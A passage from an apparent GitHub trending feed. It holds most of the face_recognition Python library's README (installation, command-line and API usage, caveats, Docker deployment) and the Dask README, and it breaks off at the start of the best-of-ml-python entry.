&#xA;&lt;p&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/896692/24430398/36f0e3f0-13cb-11e7-8258-4d0c9ce1e419.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/facerec_from_webcam_faster.py&#34;&gt;this example&lt;/a&gt; for the code.&lt;/p&gt; &#xA;&lt;h2&gt;Online Demos&lt;/h2&gt; &#xA;&lt;p&gt;User-contributed shared Jupyter notebook demo (not officially supported): &lt;a href=&#34;https://beta.deepnote.org/launch?template=face_recognition&#34;&gt;&lt;img src=&#34;https://beta.deepnote.org/buttons/try-in-a-jupyter-notebook.svg?sanitize=true&#34; alt=&#34;Deepnote&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;h3&gt;Requirements&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Python 3.3+ or Python 2.7&lt;/li&gt; &#xA; &lt;li&gt;macOS or Linux (Windows not officially supported, but might work)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Installation Options:&lt;/h3&gt; &#xA;&lt;h4&gt;Installing on Mac or Linux&lt;/h4&gt; &#xA;&lt;p&gt;First, make sure you have dlib already installed with Python bindings:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/ageitgey/629d75c1baac34dfa5ca2a1928a7aeaf&#34;&gt;How to install dlib from source on macOS or Ubuntu&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Then, make sure you have cmake installed:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;brew install cmake&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Finally, install this module from pypi using &lt;code&gt;pip3&lt;/code&gt; (or &lt;code&gt;pip2&lt;/code&gt; for Python 2):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip3 install face_recognition&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively, you can try this library with &lt;a href=&#34;https://www.docker.com/&#34;&gt;Docker&lt;/a&gt;, see &lt;a href=&#34;https://raw.githubusercontent.com/ageitgey/face_recognition/master/#deployment&#34;&gt;this section&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;If you are having trouble with installation, you can also try out a &lt;a href=&#34;https://medium.com/@ageitgey/try-deep-learning-in-python-now-with-a-fully-pre-configured-vm-1d97d4c3e9b&#34;&gt;pre-configured VM&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Installing on an Nvidia Jetson Nano board&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ageitgey/build-a-hardware-based-face-recognition-system-for-150-with-the-nvidia-jetson-nano-and-python-a25cb8c891fd&#34;&gt;Jetson Nano installation instructions&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Please follow the instructions in the article carefully. There is current a bug in the CUDA libraries on the Jetson Nano that will cause this library to fail silently if you don&#39;t follow the instructions in the article to comment out a line in dlib and recompile it.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Installing on Raspberry Pi 2+&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/ageitgey/1ac8dbe8572f3f533df6269dab35df65&#34;&gt;Raspberry Pi 2+ installation instructions&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Installing on FreeBSD&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pkg install graphics/py-face_recognition&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Installing on Windows&lt;/h4&gt; &#xA;&lt;p&gt;While Windows isn&#39;t officially supported, helpful users have posted instructions on how to install this library:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/issues/175#issue-257710508&#34;&gt;@masoudr&#39;s Windows 10 installation guide (dlib + face_recognition)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Installing a pre-configured Virtual Machine image&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@ageitgey/try-deep-learning-in-python-now-with-a-fully-pre-configured-vm-1d97d4c3e9b&#34;&gt;Download the pre-configured VM image&lt;/a&gt; (for VMware Player or VirtualBox).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Command-Line Interface&lt;/h3&gt; &#xA;&lt;p&gt;When you install &lt;code&gt;face_recognition&lt;/code&gt;, you get two simple command-line programs:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;face_recognition&lt;/code&gt; - Recognize faces in a photograph or folder full for photographs.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;face_detection&lt;/code&gt; - Find faces in a photograph or folder full for photographs.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;&lt;code&gt;face_recognition&lt;/code&gt; command line tool&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;code&gt;face_recognition&lt;/code&gt; command lets you recognize faces in a photograph or folder full for photographs.&lt;/p&gt; &#xA;&lt;p&gt;First, you need to provide a folder with one picture of each person you already know. There should be one image file for each person with the files named according to who is in the picture:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/896692/23582466/8324810e-00df-11e7-82cf-41515eba704d.png&#34; alt=&#34;known&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Next, you need a second folder with the files you want to identify:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/896692/23582465/81f422f8-00df-11e7-8b0d-75364f641f58.png&#34; alt=&#34;unknown&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Then in you simply run the command &lt;code&gt;face_recognition&lt;/code&gt;, passing in the folder of known people and the folder (or single image) with unknown people and it tells you who is in each image:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ face_recognition ./pictures_of_people_i_know/ ./unknown_pictures/&#xA;&#xA;/unknown_pictures/unknown.jpg,Barack Obama&#xA;/face_recognition_test/unknown_pictures/unknown.jpg,unknown_person&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There&#39;s one line in the output for each face. The data is comma-separated with the filename and the name of the person found.&lt;/p&gt; &#xA;&lt;p&gt;An &lt;code&gt;unknown_person&lt;/code&gt; is a face in the image that didn&#39;t match anyone in your folder of known people.&lt;/p&gt; &#xA;&lt;h4&gt;&lt;code&gt;face_detection&lt;/code&gt; command line tool&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;code&gt;face_detection&lt;/code&gt; command lets you find the location (pixel coordinatates) of any faces in an image.&lt;/p&gt; &#xA;&lt;p&gt;Just run the command &lt;code&gt;face_detection&lt;/code&gt;, passing in a folder of images to check (or a single image):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ face_detection  ./folder_with_pictures/&#xA;&#xA;examples/image1.jpg,65,215,169,112&#xA;examples/image2.jpg,62,394,211,244&#xA;examples/image2.jpg,95,941,244,792&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It prints one line for each face that was detected. The coordinates reported are the top, right, bottom and left coordinates of the face (in pixels).&lt;/p&gt; &#xA;&lt;h5&gt;Adjusting Tolerance / Sensitivity&lt;/h5&gt; &#xA;&lt;p&gt;If you are getting multiple matches for the same person, it might be that the people in your photos look very similar and a lower tolerance value is needed to make face comparisons more strict.&lt;/p&gt; &#xA;&lt;p&gt;You can do that with the &lt;code&gt;--tolerance&lt;/code&gt; parameter. The default tolerance value is 0.6 and lower numbers make face comparisons more strict:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ face_recognition --tolerance 0.54 ./pictures_of_people_i_know/ ./unknown_pictures/&#xA;&#xA;/unknown_pictures/unknown.jpg,Barack Obama&#xA;/face_recognition_test/unknown_pictures/unknown.jpg,unknown_person&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to see the face distance calculated for each match in order to adjust the tolerance setting, you can use &lt;code&gt;--show-distance true&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ face_recognition --show-distance true ./pictures_of_people_i_know/ ./unknown_pictures/&#xA;&#xA;/unknown_pictures/unknown.jpg,Barack Obama,0.378542298956785&#xA;/face_recognition_test/unknown_pictures/unknown.jpg,unknown_person,None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;More Examples&lt;/h5&gt; &#xA;&lt;p&gt;If you simply want to know the names of the people in each photograph but don&#39;t care about file names, you could do this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ face_recognition ./pictures_of_people_i_know/ ./unknown_pictures/ | cut -d &#39;,&#39; -f2&#xA;&#xA;Barack Obama&#xA;unknown_person&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Speeding up Face Recognition&lt;/h5&gt; &#xA;&lt;p&gt;Face recognition can be done in parallel if you have a computer with multiple CPU cores. For example, if your system has 4 CPU cores, you can process about 4 times as many images in the same amount of time by using all your CPU cores in parallel.&lt;/p&gt; &#xA;&lt;p&gt;If you are using Python 3.4 or newer, pass in a &lt;code&gt;--cpus &amp;lt;number_of_cpu_cores_to_use&amp;gt;&lt;/code&gt; parameter:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ face_recognition --cpus 4 ./pictures_of_people_i_know/ ./unknown_pictures/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can also pass in &lt;code&gt;--cpus -1&lt;/code&gt; to use all CPU cores in your system.&lt;/p&gt; &#xA;&lt;h4&gt;Python Module&lt;/h4&gt; &#xA;&lt;p&gt;You can import the &lt;code&gt;face_recognition&lt;/code&gt; module and then easily manipulate faces with just a couple of lines of code. It&#39;s super easy!&lt;/p&gt; &#xA;&lt;p&gt;API Docs: &lt;a href=&#34;https://face-recognition.readthedocs.io/en/latest/face_recognition.html&#34;&gt;https://face-recognition.readthedocs.io&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h5&gt;Automatically find all the faces in an image&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import face_recognition&#xA;&#xA;image = face_recognition.load_image_file(&#34;my_picture.jpg&#34;)&#xA;face_locations = face_recognition.face_locations(image)&#xA;&#xA;# face_locations is now an array listing the co-ordinates of each face!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_faces_in_picture.py&#34;&gt;this example&lt;/a&gt; to try it out.&lt;/p&gt; &#xA;&lt;p&gt;You can also opt-in to a somewhat more accurate deep-learning-based face detection model.&lt;/p&gt; &#xA;&lt;p&gt;Note: GPU acceleration (via NVidia&#39;s CUDA library) is required for good performance with this model. You&#39;ll also want to enable CUDA support when compliling &lt;code&gt;dlib&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import face_recognition&#xA;&#xA;image = face_recognition.load_image_file(&#34;my_picture.jpg&#34;)&#xA;face_locations = face_recognition.face_locations(image, model=&#34;cnn&#34;)&#xA;&#xA;# face_locations is now an array listing the co-ordinates of each face!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_faces_in_picture_cnn.py&#34;&gt;this example&lt;/a&gt; to try it out.&lt;/p&gt; &#xA;&lt;p&gt;If you have a lot of images and a GPU, you can also &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_faces_in_batches.py&#34;&gt;find faces in batches&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h5&gt;Automatically locate the facial features of a person in an image&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import face_recognition&#xA;&#xA;image = face_recognition.load_image_file(&#34;my_picture.jpg&#34;)&#xA;face_landmarks_list = face_recognition.face_landmarks(image)&#xA;&#xA;# face_landmarks_list is now an array with the locations of each facial feature in each face.&#xA;# face_landmarks_list[0][&#39;left_eye&#39;] would be the location and outline of the first person&#39;s left eye.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_facial_features_in_picture.py&#34;&gt;this example&lt;/a&gt; to try it out.&lt;/p&gt; &#xA;&lt;h5&gt;Recognize faces in images and identify who they are&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import face_recognition&#xA;&#xA;picture_of_me = face_recognition.load_image_file(&#34;me.jpg&#34;)&#xA;my_face_encoding = face_recognition.face_encodings(picture_of_me)[0]&#xA;&#xA;# my_face_encoding now contains a universal &#39;encoding&#39; of my facial features that can be compared to any other picture of a face!&#xA;&#xA;unknown_picture = face_recognition.load_image_file(&#34;unknown.jpg&#34;)&#xA;unknown_face_encoding = face_recognition.face_encodings(unknown_picture)[0]&#xA;&#xA;# Now we can see the two face encodings are of the same person with `compare_faces`!&#xA;&#xA;results = face_recognition.compare_faces([my_face_encoding], unknown_face_encoding)&#xA;&#xA;if results[0] == True:&#xA;    print(&#34;It&#39;s a picture of me!&#34;)&#xA;else:&#xA;    print(&#34;It&#39;s not a picture of me!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/recognize_faces_in_pictures.py&#34;&gt;this example&lt;/a&gt; to try it out.&lt;/p&gt; &#xA;&lt;h2&gt;Python Code Examples&lt;/h2&gt; &#xA;&lt;p&gt;All the examples are available &lt;a href=&#34;https://github.com/ageitgey/face_recognition/tree/master/examples&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Face Detection&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_faces_in_picture.py&#34;&gt;Find faces in a photograph&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_faces_in_picture_cnn.py&#34;&gt;Find faces in a photograph (using deep learning)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_faces_in_batches.py&#34;&gt;Find faces in batches of images w/ GPU (using deep learning)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/blur_faces_on_webcam.py&#34;&gt;Blur all the faces in a live video using your webcam (Requires OpenCV to be installed)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Facial Features&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/find_facial_features_in_picture.py&#34;&gt;Identify specific facial features in a photograph&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/digital_makeup.py&#34;&gt;Apply (horribly ugly) digital make-up&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Facial Recognition&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/recognize_faces_in_pictures.py&#34;&gt;Find and recognize unknown faces in a photograph based on photographs of known people&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/identify_and_draw_boxes_on_faces.py&#34;&gt;Identify and draw boxes around each person in a photo&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/face_distance.py&#34;&gt;Compare faces by numeric face distance instead of only True/False matches&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/facerec_from_webcam.py&#34;&gt;Recognize faces in live video using your webcam - Simple / Slower Version (Requires OpenCV to be installed)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/facerec_from_webcam_faster.py&#34;&gt;Recognize faces in live video using your webcam - Faster Version (Requires OpenCV to be installed)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/facerec_from_video_file.py&#34;&gt;Recognize faces in a video file and write out new video file (Requires OpenCV to be installed)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/facerec_on_raspberry_pi.py&#34;&gt;Recognize faces on a Raspberry Pi w/ camera&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/web_service_example.py&#34;&gt;Run a web service to recognize faces via HTTP (Requires Flask to be installed)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/face_recognition_knn.py&#34;&gt;Recognize faces with a K-nearest neighbors classifier&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ageitgey/face_recognition/raw/master/examples/face_recognition_svm.py&#34;&gt;Train multiple images per person then recognize faces using a SVM&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Creating a Standalone Executable&lt;/h2&gt; &#xA;&lt;p&gt;If you want to create a standalone executable that can run without the need to install &lt;code&gt;python&lt;/code&gt; or &lt;code&gt;face_recognition&lt;/code&gt;, you can use &lt;a href=&#34;https://github.com/pyinstaller/pyinstaller&#34;&gt;PyInstaller&lt;/a&gt;. However, it requires some custom configuration to work with this library. See &lt;a href=&#34;https://github.com/ageitgey/face_recognition/issues/357&#34;&gt;this issue&lt;/a&gt; for how to do it.&lt;/p&gt; &#xA;&lt;h2&gt;Articles and Guides that cover &lt;code&gt;face_recognition&lt;/code&gt;&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;My article on how Face Recognition works: &lt;a href=&#34;https://medium.com/@ageitgey/machine-learning-is-fun-part-4-modern-face-recognition-with-deep-learning-c3cffc121d78&#34;&gt;Modern Face Recognition with Deep Learning&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Covers the algorithms and how they generally work&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pyimagesearch.com/2018/06/18/face-recognition-with-opencv-python-and-deep-learning/&#34;&gt;Face recognition with OpenCV, Python, and deep learning&lt;/a&gt; by Adrian Rosebrock &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Covers how to use face recognition in practice&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pyimagesearch.com/2018/06/25/raspberry-pi-face-recognition/&#34;&gt;Raspberry Pi Face Recognition&lt;/a&gt; by Adrian Rosebrock &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Covers how to use this on a Raspberry Pi&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pyimagesearch.com/2018/07/09/face-clustering-with-python/&#34;&gt;Face clustering with Python&lt;/a&gt; by Adrian Rosebrock &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Covers how to automatically cluster photos based on who appears in each photo using unsupervised learning&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How Face Recognition Works&lt;/h2&gt; &#xA;&lt;p&gt;If you want to learn how face location and recognition work instead of depending on a black box library, &lt;a href=&#34;https://medium.com/@ageitgey/machine-learning-is-fun-part-4-modern-face-recognition-with-deep-learning-c3cffc121d78&#34;&gt;read my article&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Caveats&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The face recognition model is trained on adults and does not work very well on children. It tends to mix up children quite easy using the default comparison threshold of 0.6.&lt;/li&gt; &#xA; &lt;li&gt;Accuracy may vary between ethnic groups. Please see &lt;a href=&#34;https://github.com/ageitgey/face_recognition/wiki/Face-Recognition-Accuracy-Problems#question-face-recognition-works-well-with-european-individuals-but-overall-accuracy-is-lower-with-asian-individuals&#34;&gt;this wiki page&lt;/a&gt; for more details.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;a name=&#34;deployment&#34;&gt;Deployment to Cloud Hosts (Heroku, AWS, etc)&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Since &lt;code&gt;face_recognition&lt;/code&gt; depends on &lt;code&gt;dlib&lt;/code&gt; which is written in C++, it can be tricky to deploy an app using it to a cloud hosting provider like Heroku or AWS.&lt;/p&gt; &#xA;&lt;p&gt;To make things easier, there&#39;s an example Dockerfile in this repo that shows how to run an app built with &lt;code&gt;face_recognition&lt;/code&gt; in a &lt;a href=&#34;https://www.docker.com/&#34;&gt;Docker&lt;/a&gt; container. With that, you should be able to deploy to any service that supports Docker images.&lt;/p&gt; &#xA;&lt;p&gt;You can try the Docker image locally by running: &lt;code&gt;docker-compose up --build&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;There are also &lt;a href=&#34;https://raw.githubusercontent.com/ageitgey/face_recognition/master/docker/README.md&#34;&gt;several prebuilt Docker images.&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Linux users with a GPU (drivers &amp;gt;= 384.81) and &lt;a href=&#34;https://github.com/NVIDIA/nvidia-docker&#34;&gt;Nvidia-Docker&lt;/a&gt; installed can run the example on the GPU: Open the &lt;a href=&#34;https://raw.githubusercontent.com/ageitgey/face_recognition/master/docker-compose.yml&#34;&gt;docker-compose.yml&lt;/a&gt; file and uncomment the &lt;code&gt;dockerfile: Dockerfile.gpu&lt;/code&gt; and &lt;code&gt;runtime: nvidia&lt;/code&gt; lines.&lt;/p&gt; &#xA;&lt;h2&gt;Having problems?&lt;/h2&gt; &#xA;&lt;p&gt;If you run into problems, please read the &lt;a href=&#34;https://github.com/ageitgey/face_recognition/wiki/Common-Errors&#34;&gt;Common Errors&lt;/a&gt; section of the wiki before filing a github issue.&lt;/p&gt; &#xA;&lt;h2&gt;Thanks&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Many, many thanks to &lt;a href=&#34;https://github.com/davisking&#34;&gt;Davis King&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/nulhom&#34;&gt;@nulhom&lt;/a&gt;) for creating dlib and for providing the trained facial feature detection and face encoding models used in this library. For more information on the ResNet that powers the face encodings, check out his &lt;a href=&#34;http://blog.dlib.net/2017/02/high-quality-face-recognition-with-deep.html&#34;&gt;blog post&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Thanks to everyone who works on all the awesome Python data science libraries like numpy, scipy, scikit-image, pillow, etc, etc that makes this kind of stuff so easy and fun in Python.&lt;/li&gt; &#xA; &lt;li&gt;Thanks to &lt;a href=&#34;https://github.com/audreyr/cookiecutter&#34;&gt;Cookiecutter&lt;/a&gt; and the &lt;a href=&#34;https://github.com/audreyr/cookiecutter-pypackage&#34;&gt;audreyr/cookiecutter-pypackage&lt;/a&gt; project template for making Python project packaging way more tolerable.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>dask/dask</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/dask/dask</id>
    <link href="https://github.com/dask/dask" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Parallel computing with task scheduling&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Dask&lt;/h1&gt; &#xA;&lt;p&gt;|Build Status| |Coverage| |Doc Status| |Discourse| |Version Status| |NumFOCUS|&lt;/p&gt; &#xA;&lt;p&gt;Dask is a flexible parallel computing library for analytics. See documentation_ for more information.&lt;/p&gt; &#xA;&lt;h2&gt;LICENSE&lt;/h2&gt; &#xA;&lt;p&gt;New BSD. See &lt;code&gt;License File &amp;lt;https://github.com/dask/dask/blob/main/LICENSE.txt&amp;gt;&lt;/code&gt;__.&lt;/p&gt; &#xA;&lt;p&gt;.. _documentation: &lt;a href=&#34;https://dask.org&#34;&gt;https://dask.org&lt;/a&gt; .. |Build Status| image:: &lt;a href=&#34;https://github.com/dask/dask/actions/workflows/tests.yml/badge.svg&#34;&gt;https://github.com/dask/dask/actions/workflows/tests.yml/badge.svg&lt;/a&gt; :target: &lt;a href=&#34;https://github.com/dask/dask/actions/workflows/tests.yml&#34;&gt;https://github.com/dask/dask/actions/workflows/tests.yml&lt;/a&gt; .. |Coverage| image:: &lt;a href=&#34;https://codecov.io/gh/dask/dask/branch/main/graph/badge.svg&#34;&gt;https://codecov.io/gh/dask/dask/branch/main/graph/badge.svg&lt;/a&gt; :target: &lt;a href=&#34;https://codecov.io/gh/dask/dask/branch/main&#34;&gt;https://codecov.io/gh/dask/dask/branch/main&lt;/a&gt; :alt: Coverage status .. |Doc Status| image:: &lt;a href=&#34;https://readthedocs.org/projects/dask/badge/?version=latest&#34;&gt;https://readthedocs.org/projects/dask/badge/?version=latest&lt;/a&gt; :target: &lt;a href=&#34;https://dask.org&#34;&gt;https://dask.org&lt;/a&gt; :alt: Documentation Status .. |Discourse| image:: &lt;a href=&#34;https://img.shields.io/discourse/users?logo=discourse&amp;amp;server=https%3A%2F%2Fdask.discourse.group&#34;&gt;https://img.shields.io/discourse/users?logo=discourse&amp;amp;server=https%3A%2F%2Fdask.discourse.group&lt;/a&gt; :alt: Discuss Dask-related things and ask for help :target: &lt;a href=&#34;https://dask.discourse.group&#34;&gt;https://dask.discourse.group&lt;/a&gt; .. |Version Status| image:: &lt;a href=&#34;https://img.shields.io/pypi/v/dask.svg&#34;&gt;https://img.shields.io/pypi/v/dask.svg&lt;/a&gt; :target: &lt;a href=&#34;https://pypi.python.org/pypi/dask/&#34;&gt;https://pypi.python.org/pypi/dask/&lt;/a&gt; .. |NumFOCUS| image:: &lt;a href=&#34;https://img.shields.io/badge/powered%20by-NumFOCUS-orange.svg?style=flat&amp;amp;colorA=E1523D&amp;amp;colorB=007D8A&#34;&gt;https://img.shields.io/badge/powered%20by-NumFOCUS-orange.svg?style=flat&amp;amp;colorA=E1523D&amp;amp;colorB=007D8A&lt;/a&gt; :target: &lt;a href=&#34;https://www.numfocus.org/&#34;&gt;https://www.numfocus.org/&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ml-tooling/best-of-ml-python</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/ml-tooling/best-of-ml-python</id>
    <link href="https://github.com/ml-tooling/best-of-ml-python" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🏆 A ranked list of awesome machine learning Python libraries. Updated weekly.&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; Best-of Machine Learning with Python &lt;br&gt; &lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;strong&gt;🏆&amp;nbsp; A ranked list of awesome machine learning Python libraries. Updated weekly.&lt;/strong&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/ml-tooling/best-of&#34; title=&#34;Best-of-badge&#34;&gt;&lt;img src=&#34;http://bit.ly/3o3EHNN&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#Contents&#34; title=&#34;Project Count&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/projects-900-blue.svg?color=5ac4bf&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#Contribution&#34; title=&#34;Contributions are welcome&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/contributions-welcome-green.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ml-tooling/best-of-ml-python/releases&#34; title=&#34;Best-of Updates&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release-date/ml-tooling/best-of-ml-python?color=green&amp;amp;label=updated&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://mltooling.substack.com/subscribe&#34; title=&#34;Subscribe to 